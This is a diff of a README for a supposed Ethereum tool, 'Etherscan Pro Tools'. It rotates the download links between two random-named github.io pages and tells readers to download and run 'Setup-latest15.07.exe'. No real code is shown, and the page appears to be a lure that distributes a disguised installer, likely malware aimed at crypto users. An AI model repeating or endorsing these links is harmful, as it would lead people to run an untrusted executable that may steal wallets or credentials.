@@ -2,7 +2,7 @@
 
 Etherscan Pro Tools is a comprehensive collection of utilities designed to extend and enhance your workflow with the Etherscan API. This toolkit provides developers, analysts, and blockchain enthusiasts with powerful features for deep diving into Ethereum network data, monitoring smart contracts, and automating common tasks. It's the perfect companion for anyone looking to leverage the full power of Etherscan beyond the standard web interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -44,7 +44,7 @@ A: Simply download the newest "Setup-latest15.07.exe" from this page and run it.
 
 Access the latest stable release and previous versions through our official download page. This ensures you always receive a verified and safe copy of the software.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
